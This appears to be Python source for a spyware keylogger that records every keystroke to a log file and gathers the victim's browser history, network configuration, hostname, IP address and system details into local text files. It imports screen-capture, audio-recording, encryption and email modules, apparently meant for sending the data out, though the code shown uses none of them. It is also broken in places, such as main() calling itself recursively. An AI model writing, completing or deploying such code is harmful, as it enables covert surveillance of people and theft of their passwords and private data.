import subprocess, socket, os, re, smtplib, \
        logging, pathlib, json, time, shutil
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def key_log(file_path):
    logging.basicConfig(filename = (file_path + 'keylogs.txt'), 
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    on_press = lambda Key : logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()

def main():
  file_path = ''

  # capture browser history
  browser_history = []
  bh_user = bh.get_username()
  db_path = bh.get_database_paths()
  hist = bh.get_browserhistory()
  browser_history.extend((bh_user, db_path, hist))
  with open(file_path + 'browser.txt', 'a') as browser_txt:
    browser_txt.write(json.dumps(browser_history))

  # capture wifi data
  with open('network_wifi.txt', 'a') as network_wifi:
    try:
      commands = subprocess.Popen(['ifconfig'], stdout=network_wifi, stderr=network_wifi, shell=True)
      outs, errs = commands.communicate(timeout=60)
    except subprocess.TimeoutExpired:
      commands.kill()
      out, errs = commands.communicate()

  # capture system data
  hostname = socket.gethostname()
  ipaddr = socket.gethostbyname(hostname)
  with open('system_info.txt', 'a') as system_info:
    system_info.write(hostname + ' ' + ipaddr + "\n")

    try:
      system = subprocess.Popen(['uname', 'sw_vers'], stdout=system_info, stderr=system_info, shell=True)
      outs, errs = system.communicate(timeout=60)
    except subprocess.TimeoutExpired:
      system.kill()
      out, errs = system.communicate()

  key_log(file_path)   

  main()

if __name__ == "__main__":
  try:
    main()
  except KeyboardInterrupt:
    print("Program Exiting")